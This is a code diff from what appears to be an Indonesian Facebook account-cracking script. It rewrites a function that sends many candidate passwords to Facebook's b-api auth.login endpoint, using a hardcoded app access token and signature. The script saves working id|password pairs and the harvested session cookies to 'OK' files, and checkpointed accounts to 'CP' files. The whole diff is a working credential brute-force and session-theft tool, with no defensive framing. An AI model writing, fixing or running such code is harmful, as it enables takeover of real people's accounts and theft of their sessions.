@@ -1553,26 +1553,49 @@ def metcepat():
 
 
 #-------------------[ CRACK-MAIN ]------------#
+import requests
+import json
+
 def b_api(idf, pwv):
     global loop, ok, cp
-    bo = random.choice([m, k, h, b, u, x])
-    rr = random.randint
-    rc = random.choice
     ses = requests.Session()
-    prog.update(des, description=f" {K2}•{H2} FANKY B-API {H2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
-    prog.advance(des)
+    
     ua = 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36 [FBAN/FB4A;FBAV/300.1.0.58.129;FBBV/247967041;FBLC/en_US;FBRV/0;FBCR/Verizon;FBMF/samsung;FBBD/samsung;FBDV/SM-G973F;FBSV/10;FBCA/arm64-v8a:;FBDM/{density=2.625}]'
-    # ua = random.choice(ugen)
+
+    headers = {
+        'User-Agent': ua,
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Accept': 'application/json',
+        'Accept-Language': 'en-US,en;q=0.5',
+        'Connection': 'keep-alive',
+        'Referer': 'https://www.facebook.com/',
+        'Origin': 'https://www.facebook.com',
+        'Host': 'b-api.facebook.com',
+        'X-Requested-With': 'XMLHttpRequest',
+        'DNT': '1',
+        'TE': 'Trailers'
+    }
+    
     for pw in pwv:
         try:
-            if 'ya' in ualuh: ua = ualu[0]
-            # url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + idf + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
-            # headers = {'User-Agent': ua, 'Content-Type': 'application/x-www-form-urlencoded', 'Accept': 'application/json', 'Accept-Language': 'en-US,en;q=0.5', 'Connection': 'keep-alive', 'Referer': 'https://www.facebook.com/', 'Origin': 'https://www.facebook.com', 'Host': 'b-api.facebook.com', 'X-Requested-With': 'XMLHttpRequest', 'DNT': '1', 'TE': 'Trailers'}
-            # req = urllib.request.Request(url, headers=headers)
-            # data = urllib.request.urlopen(req)
-            # fannn = json.load(data)
-            data = urllib.request.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + idf + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-            fannn = json.load(data)
+            # Mengirim POST request menggunakan requests.Session().post
+            url = 'https://b-api.facebook.com/method/auth.login'
+            params = {
+                'access_token': '237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1',
+                'format': 'json',
+                'sdk_version': '2',
+                'email': idf,
+                'locale': 'en_US',
+                'password': pw,
+                'sdk': 'ios',
+                'generate_session_cookies': '1',
+                'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'
+            }
+            
+            response = ses.post(url, headers=headers, data=params)
+            fannn = response.json()
+            
+            # Pengecekan akun
             if 'User must verify their account' in fannn['error_msg']:
                 cp += 1
                 tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
@@ -1582,6 +1605,7 @@ def b_api(idf, pwv):
                 prints(tree)
                 open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
                 break
+
             elif "access_token" in fannn:
                 ok += 1
                 fannnnnn_cookies = sorted(fannn["session_cookies"], key=lambda x: (x["name"] != "datr", x["name"]))
@@ -1592,12 +1616,15 @@ def b_api(idf, pwv):
                 tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
                 tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
                 prints(tree)
-                open("OK/" + okc, "a").write(idf + "|" + pw + "|" +kuki+ "\n")
+                open("OK/" + okc, "a").write(idf + "|" + pw + "|" + kuki + "\n")
                 break
+
             else:
                 continue
+                
         except requests.exceptions.ConnectionError:
             time.sleep(31)
+            
     loop += 1
 	
 #-------------------[ CRACK-MAIN ]------------#
